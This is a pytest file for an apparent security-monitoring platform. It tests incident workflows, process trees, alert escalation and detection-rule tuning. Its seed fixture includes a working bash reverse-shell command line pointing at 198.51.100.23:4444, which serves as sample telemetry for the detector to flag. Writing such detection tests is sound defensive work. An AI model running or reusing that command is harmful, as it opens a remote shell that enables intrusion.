"""Investigation workflow: lifecycle, journal, evidence, timeline, process tree and graph."""

from __future__ import annotations

from fastapi.testclient import TestClient

from tests.conftest import Api, event, ingest


def _seed(app_client: TestClient, agent_token: str) -> None:
    shell = {
        "pid": 200,
        "ppid": 100,
        "name": "bash",
        "executable": "/usr/bin/bash",
        "command_line": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
    }
    sshd = {
        "pid": 100,
        "ppid": 1,
        "name": "sshd",
        "executable": "/usr/sbin/sshd",
        "command_line": "sshd: deploy",
    }
    ingest(
        app_client,
        agent_token,
        [
            event(process=sshd, user={"name": "root"}),
            event(process=shell, user={"name": "deploy"}),
            event(
                category="network",
                action="connect",
                user={"name": "deploy"},
                process={"pid": 200, "name": "bash"},
                network={
                    "direction": "outbound",
                    "protocol": "tcp",
                    "src_ip": "10.0.0.5",
                    "src_port": 50000,
                    "dst_ip": "198.51.100.23",
                    "dst_port": 4444,
                },
            ),
        ],
    )


def test_incident_lifecycle(app_client: TestClient, admin: Api, agent_token: str) -> None:
    _seed(app_client, agent_token)
    incident = admin.get("/api/v1/incidents").json()["items"][0]
    iid = incident["id"]
    assert incident["status"] == "new"
    assert incident["alert_count"] == 2  # reverse shell + suspicious port grouped together

    me = admin.get("/api/v1/auth/me").json()
    patched = admin.patch(
        f"/api/v1/incidents/{iid}",
        json={"status": "investigating", "assignee_id": me["id"], "note": "Taking this one."},
    )
    assert patched.status_code == 200
    assert patched.json()["assignee_name"] == me["display_name"]
    # invalid transition
    assert admin.patch(f"/api/v1/incidents/{iid}", json={"status": "new"}).status_code == 409

    assert (
        admin.post(
            f"/api/v1/incidents/{iid}/comments", json={"body": "Reverse shell confirmed."}
        ).status_code
        == 201
    )
    events = admin.get(f"/api/v1/incidents/{iid}/events").json()
    assert len(events) == 2
    evidence = admin.post(
        f"/api/v1/incidents/{iid}/evidence",
        json={"kind": "event", "reference": events[0]["id"], "label": "Shell command line"},
    )
    assert evidence.status_code == 201

    detail = admin.get(f"/api/v1/incidents/{iid}").json()
    kinds = [j["entry_type"] for j in detail["journal"]]
    assert kinds[0] == "system" and "comment" in kinds and "change" in kinds
    assert detail["evidence"][0]["label"] == "Shell command line"
    assert "T1059.004" in detail["attack_techniques"]
    assert detail["endpoints"][0]["hostname"] == "host-a"

    resolved = admin.patch(f"/api/v1/incidents/{iid}", json={"status": "resolved"}).json()
    assert resolved["resolved_at"] is not None

    audit = admin.get("/api/v1/audit", params={"action": "incident."}).json()
    assert audit["total"] >= 3


def test_timeline_context_process_tree_and_graph(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    _seed(app_client, agent_token)
    iid = admin.get("/api/v1/incidents").json()["items"][0]["id"]
    with_context = admin.get(
        f"/api/v1/incidents/{iid}/events", params={"context_minutes": 30}
    ).json()
    assert len(with_context) == 3  # sshd start is context, not evidence

    trees = admin.get(f"/api/v1/incidents/{iid}/process-tree").json()
    root = trees["host-a"][0]
    assert root["name"] == "sshd"
    assert root["children"][0]["name"] == "bash"
    assert root["children"][0]["flagged"] is True

    graph = admin.get(f"/api/v1/incidents/{iid}/graph").json()
    kinds = {n["kind"] for n in graph["nodes"]}
    assert {"host", "process", "user", "ip", "alert"} <= kinds
    ip = next(n for n in graph["nodes"] if n["kind"] == "ip")
    assert ip["label"] == "198.51.100.23"

    exported = admin.get(f"/api/v1/incidents/{iid}/export").json()
    assert exported["incident"]["id"] == iid and len(exported["events"]) == 2


def test_escalate_alerts_to_new_incident(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    tmp = {"pid": 5, "name": "x", "executable": "/tmp/x", "command_line": "/tmp/x"}
    ingest(app_client, agent_token, [event(process=tmp)])  # medium: no automatic incident
    assert admin.get("/api/v1/incidents").json()["total"] == 0
    alert = admin.get("/api/v1/alerts").json()["items"][0]
    created = admin.post(
        "/api/v1/alerts/escalate", json={"alert_ids": [alert["id"]], "title": "Dropped binary"}
    )
    assert created.status_code == 201
    assert created.json()["severity"] == "medium"
    assert admin.get(f"/api/v1/alerts/{alert['id']}").json()["status"] == "acknowledged"


def test_false_positive_closes_alert(app_client: TestClient, admin: Api, agent_token: str) -> None:
    tmp = {"pid": 5, "name": "x", "executable": "/tmp/x"}
    ingest(app_client, agent_token, [event(process=tmp)])
    alert = admin.get("/api/v1/alerts").json()["items"][0]
    out = admin.patch(
        f"/api/v1/alerts/{alert['id']}", json={"disposition": "false_positive"}
    ).json()
    assert out["status"] == "closed" and out["triaged_at"]
    analytics = admin.get("/api/v1/analytics").json()
    assert analytics["false_positive_rate"]["value"] == 100.0
    assert analytics["time_to_triage_seconds"]["samples"] == 1


def test_rule_disable_stops_alerts(app_client: TestClient, admin: Api, agent_token: str) -> None:
    rule = "aegis-lnx-exec-from-tmp"
    assert (
        admin.patch(
            f"/api/v1/detections/rules/{rule}", json={"enabled": False, "reason": "tuning"}
        ).status_code
        == 200
    )
    ingest(
        app_client, agent_token, [event(process={"pid": 5, "name": "x", "executable": "/tmp/x"})]
    )
    assert admin.get("/api/v1/alerts").json()["total"] == 0
    detail = admin.get(f"/api/v1/detections/rules/{rule}").json()
    assert detail["enabled"] is False and detail["versions"][0]["version"] == 1


def test_rule_dry_run(app_client: TestClient, admin: Api, agent_token: str) -> None:
    ingest(
        app_client, agent_token, [event(process={"pid": 5, "name": "x", "executable": "/tmp/x"})]
    )
    draft = """
title: Draft
id: draft-rule-0001
logsource: {product: linux, category: process_creation}
detection:
  sel:
    Image|startswith: /tmp/
  condition: sel
level: low
"""
    result = admin.post("/api/v1/detections/test", json={"content": draft}).json()
    assert result["valid"] and result["matched"] == 1
    broken = admin.post(
        "/api/v1/detections/test", json={"content": draft.replace("startswith", "base64")}
    ).json()
    assert broken["valid"] is False and "modifier" in broken["error"]
